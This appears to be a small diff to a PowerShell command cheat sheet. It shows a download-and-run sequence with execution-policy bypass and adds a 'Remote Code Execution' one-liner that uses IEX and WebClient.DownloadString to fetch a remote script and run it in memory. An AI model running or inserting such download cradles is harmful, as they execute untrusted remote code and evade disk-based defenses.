@@ -65,3 +65,6 @@
 `$url = "https://site.com/script.ps1"`  
 `Invoke-WebRequest -Uri $url -OutFile "script.ps1"`  
 `Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File script.ps1"`  
+\# Remote Code Execution - IEX = Invoke-Expression (run script from memory)  
+`$url = "https://site.com/script.ps1"`  
+`IEX (New-Object System.Net.WebClient).DownloadString($url)`  
